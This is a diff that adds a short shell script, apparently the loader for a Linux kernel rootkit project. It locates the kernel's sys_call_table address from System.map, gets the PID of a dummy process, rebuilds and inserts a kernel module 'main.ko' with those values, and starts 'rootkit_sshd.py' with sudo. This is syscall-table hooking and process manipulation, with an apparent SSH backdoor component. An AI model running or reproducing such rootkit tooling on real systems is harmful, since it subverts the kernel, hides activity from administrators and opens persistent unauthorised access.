@@ -1,0 +1,10 @@
+rmmod main
+python3 dummy_process.py&
+kernel=$(uname -r)
+sys_call_table_location=$(grep -oP '.*(?= R sys_call_table)' /boot/System.map-$kernel)
+pid=$(ps aux| grep '.* .*:\w* python3 dummy_process.py'| awk '{print $2}')
+echo $pid
+./delete
+./build
+insmod main.ko sys_call_table_location=0x$sys_call_table_location pid=$pid
+sudo python3 rootkit_sshd.py&
